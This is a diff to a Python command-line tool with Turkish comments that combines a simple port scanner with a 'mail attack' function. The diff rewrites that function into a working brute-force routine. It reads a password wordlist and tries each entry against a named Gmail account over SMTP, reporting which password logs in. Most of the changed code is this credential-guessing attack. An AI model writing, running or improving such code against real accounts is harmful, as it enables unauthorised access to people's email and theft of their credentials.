@@ -56,10 +56,11 @@ def basicPortAttack(): #Tek parametre ile port taramasi yapan fonksiyon
     print ("\n"+10*" " +"Shutting at:", t6)
     sys.exit()
 
-def advancedPortAttack(): #Birden fazla parametre ile port taramasi yapan fonksiyon 
+def advancedPortAttack(): #Birden fazla parametre ile port taramasi yapan fonksiyon
+    banner()
     t1 = time.strftime('%X')
-    remoteServer = param2
-    port = int(param4)
+    remoteServer = sys.argv[2]
+    port = int(sys.argv[4])
     print ("\n" +10 * " " + "Started at:",t1)
     print ("\n[{}][INFO]: Check port {} on the {}".format(t1,port,remoteServer))    
     try:
@@ -92,61 +93,47 @@ def advancedPortAttack(): #Birden fazla parametre ile port taramasi yapan fonksi
     print ("\n"+10*" " +"Shutting at:", t7)
     sys.exit()
 
-def mailAttack():#Mail saldirisi yapan fonksiyon 
+def mailAttack():#Mail saldirisi yapan fonksiyon
+    banner()
     t1 = time.strftime('%X')
     print ("\n" +5 * " " + "Started at:",t1+"\n")
-    i = 0
-    file_path= sys.argv[4] 
-    pass_file = open(file_path,"r")
-    pass_list = pass_file.readlines()
-    user_name = sys.argv[2]
-    
-    for password in pass_list:
-        i = i + 1
-        pass_count = str(i) + '-' + str(len(pass_list))
+ 
+    user = sys.argv[2]
+    passwfile= sys.argv[4]
+    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+    smtpserver.ehlo()
+    smtpserver.starttls()
+    try:
+        t2 = time.strftime('%X')
+        passwfile = open(passwfile, "r")
+    except:
+        print("[{}][ERROR]: File not found!".format(t2))
+        sys.exit()
+
+    for password in passwfile:
         try:
-            server = smtplib.SMTP_SSL("smtp.gmail.com", 587)
-            server.ehlo()
-            server.login(user_name, password)
-            print ("[INFO]: Login Succesfuly, password :" + password)
-            break  
-        except smtplib.SMTPAuthenticationError as e:
-            t2 = time.strftime('%X')
-            error = str(e)
-            if error[14] == '<':
-                print ("[INFO]: Login Succesfuly, password :" + password )
-                break
-            else:
-                print ("[{}][ATTEMPT]: target: {}  pass: {} ".format(t2,user_name,password))
-        except KeyboardInterrupt:
+            smtpserver.login(user, password)
             t3 = time.strftime('%X')
-            print ("["+t3+"][CRITICAL]: User Quit")
-            sys.exit()
-        except socket.error: 
+            print ("[{}][INFO]: Login Succesfuly, password : {}".format(t3,password))
+            break
+        except smtplib.SMTPAuthenticationError:
             t4 = time.strftime('%X')
-            print ("["+t4+"][ERROR]: Check your Internet Connection")
-            print ("\n"+5*" "+"Shutting at: "+t4)
-            sys.exit()
+            print ("[{}][ATTEMPT]: target: {}  trying: {} ".format(t4,user,password))
+
     t5 = time.strftime('%X')
     print ("\n"+5*" "+"Shutting at: "+t5)
 
-def main():#Program baslangici ana fonksiyon 
-    if len(sys.argv) > 1:
-        if len(sys.argv) == 3:
-            if sys.argv[1] == "-h" or "-H":
-                basicPortAttack()
-        elif len(sys.argv) == 5:
-            banner()
-            param1 = sys.argv[1]
-            param2 = sys.argv[2]
-            param3 = sys.argv[3]
-            param4 = sys.argv[4]
-            if ((param1 == "-M") and (param3 == "-P")):
-                mailAttack()
-            elif (param1 == "-H") and (param3 == "-P"):
-                advancedPortAttack()
-            else:
-                print("Check argüments")   
+def main():#Program baslangici ana fonksiyon
+
+    if ((len(sys.argv) == 3) and (sys.argv[1] == "-h" or "-H")):
+        basicPortAttack()
+        sys.exit()
+    if ((len(sys.argv) == 5) and (sys.argv[1] == "-M") and (sys.argv[3] == "-P")):
+        mailAttack()
+        sys.exit()
+    if ((len(sys.argv) == 5) and sys.argv[1] == "-H") and (sys.argv[3] == "-P"):
+        advancedPortAttack()
+        sys.exit()
     else:
         banner()
         print ("\nerror: please make sure you entered the parameters correctly!\n")
